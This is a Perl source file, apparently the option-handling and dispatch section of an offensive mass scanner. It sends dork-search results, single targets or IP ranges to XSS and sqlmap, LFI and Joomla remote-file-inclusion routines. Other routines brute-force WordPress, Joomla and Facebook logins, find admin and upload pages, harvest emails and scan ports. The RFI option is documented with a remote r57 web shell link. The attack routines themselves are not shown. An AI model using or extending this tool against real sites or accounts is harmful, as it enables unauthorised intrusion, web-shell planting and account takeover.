## ARGUMENTS VERIFICATION (TARGET AND RANGIP)
if ((defined $Target) || (defined $rangip)) {
  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $ifinurl) && (!defined $unique) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
  advise();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS VERIFICATION (TARGET AND RANGIP)
if ((defined $replace) && (defined $with)) {
  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $ifinurl) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
  advise();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS VERIFICATION (REPLACE)
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS VERIFICATION (LEVEL)
if (defined $msites){
  if (!defined $mlevel) {
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";   
    print "\033[0;33m[!] To scan server sites You have to set level [Ex: --level 10]!\n";
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS VERIFICATION (LEVEL)
if ((defined $dork) && (!defined $mlevel)) {
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  print "\033[0;33m[!] You have to set scan level [Ex: --level 10]\n";
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS VERIFICATION (SHELL / REPLACE/BRUTE FORCE)
if ((defined $dork) || (defined $Target) || (defined $rangip)) {
  if (defined $mjoomrfi) {
	if (!defined $shell) {
      print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";      
      print "\033[0;33m[!] You have to set shell link! [Ex: http://www.site.co.uk/r57.txt]\n";
	  exit();
    }
  }
  if (((defined $replace) && (!defined $with)) || ((!defined $replace) && (defined $with))){
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";   
    print "\033[0;33m[!] Invalid option! [Ex: --replace <value> --with <value>]\n";
	exit();
  }
  if (((defined $wpbf) || (defined $joombf)) && ((!defined $username) || (!defined $password))){
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";   
    print "\033[0;33m[!] Invalid option! [Ex: --wpbf/joombf --user <value> --pass <pass.txt>]\n";
	exit();
  }
}
if ((defined $fbbf) && ((!defined $username) || (!defined $password))) {
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";   
  print "\033[0;33m[!] Invalid option! [Ex: --fbbf --user <email> --pass <pass.txt>]\n";
  exit();
}
if (!defined $dork) {
  if ((defined $unique) || (defined $ifinurl)) {
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";   
    print "\033[0;33m[!] Invalid option! --ifinurl or --unique needs dork search!\n";
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS PROCESS
if (defined $mlevel) {
  if ($mlevel < 10) {
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";   
    print "\033[0;33m[!] Min level is 10 [--level >=10]\n";
	exit();
  }
  if ((defined $dork) || (defined $Target) || (defined $rangip)){
    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $wpbf) && (!defined $joombf) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails)) {
      submsearch();
      exit();
    }else{
      submsearch();
	  if (defined $dork) {
	    if (defined $misup) { misup();}
	    if (defined $validation_text) {mvalidation();}
        if (defined $command) {mcommand();}
        if (defined $mxss) {
          if (defined $sqlmap) {
	        mxss(); sqlmap();
          }else{
            mxss();
	      }
        }
		if (defined $mlfi) { mlfi();}
		if (defined $mjoomrfi) { mjoomrfi();}
		if (defined $mwpadf) { mwpadf();}
		if (defined $madmin) { madmin();}
		if (defined $msubdomain) { msubdomain();}
		if (defined $mwpsites) { mwpsites();}
		if (defined $mjoomsites) { mjoomsites();}
		if (defined $mupload) { muploadsites();}
		if (defined $mzip) { mzipsites();}
	    if (defined $mmails) { mmails();}
	    if (defined $wpbf) { BFmwpsites();}
	    if (defined $joombf) { BFmjoomsites();}
	  }elsif (defined $Target) {
	    if (defined $misup) { misup();}
	    if (defined $validation_text) {mvalidation();}
        if (defined $command) {mcommand();}
        if (defined $mxss) {
          if (defined $sqlmap) {
	        mxss(); sqlmap();
          }else{
            mxss();
	      }
        }
		if (defined $mlfi) { mlfi();}
		if (defined $mjoomrfi) { mjoomrfi();}
		if (defined $mwpadf) { mwpadf();}
		if (defined $madmin) { madmin();}
		if (defined $msubdomain) { msubdomain();}
		if (defined $mwpsites) { mwpsites();}
		if (defined $mjoomsites) { mjoomsites();}
		if (defined $mupload) { muploadsites();}
		if (defined $mzip) { mzipsites();}
	    if (defined $mmails) { mmails();}
	    if (defined $wpbf) { BFmwpsites();}
	    if (defined $joombf) { BFmjoomsites();}        
	  }
    }
   exit();
  }
}else{
  if ((defined $Target)  || (defined $rangip)){
    scandetail();
    if (defined $misup) {misup();}
    if (defined $validation_text) { mvalidation();}
    if (defined $command) {mcommand();}
    if (defined $mxss) {
      if (defined $sqlmap) {
	    mxss(); sqlmap();
      }else{
        mxss();
	  }
    }
	if (defined $mlfi) { mlfi();}
	if (defined $mjoomrfi) { mjoomrfi();}
	if (defined $mwpadf) { mwpadf();}
	if (defined $madmin) { madmin();}
	if (defined $msubdomain) { msubdomain();}
	if (defined $mwpsites) { mwpsites();}
	if (defined $mjoomsites) { mjoomsites();}
	if (defined $mupload) { muploadsites();}
	if (defined $mzip) { mzipsites();}
	if (defined $mmails) { mmails();}
	if (defined $mports) { 
      if (defined $mbasic) {
        if ($mbasic eq "tcp") { basic('tcp'); }
        if ($mbasic eq "udp") { basic('udp'); }
        if (($mbasic eq "udp+tcp") || ($mbasic eq "tcp+udp")) { basic2();}
	  }
      if (defined $mall) {
        if ($mall eq "tcp") { complete('tcp');}
        if ($mall eq "udp") { complete('udp');}
        if (($mall eq "udp+tcp") || ($mall eq "tcp+udp")) { complete2(); }
	  }
      if (defined $muser) {
	    if ((!defined $mstart) && (!defined $mend)) {
          print "\033[0;33m[!] Set a port range! [Ex: --start 21 --end 81]\n";          
	      exit();
	    }else{
          if ($muser eq "tcp") { user('tcp');}
          if ($muser eq "udp") { user('udp');}
          if (($muser eq "udp+tcp") || ($muser eq "tcp+udp")) { user2(); }
		}
	  }
	}
	if (defined $wpbf) { BFmwpsites();}
	if (defined $joombf) { BFmjoomsites();}
	exit();
  }
}
if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
  use Digest::MD5;
  use MIME::Base64;
  if (defined $mmd5) { mmd5();exit();
  }elsif (defined $mencode64) { mencode64();exit();
  }elsif (defined $mdecode64) { mdecode64();exit();}
}
if (defined $fbbf) { fbbf();}
if (defined $mabout) { mabout(); exit();}
if (defined $checkversion) { checkversion(); exit();}
if (defined $help) { help(); exit();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## Copy@right Alisam Technology Team
## 
############################################################################################################################################################################################
############################################################################################################################################################################################
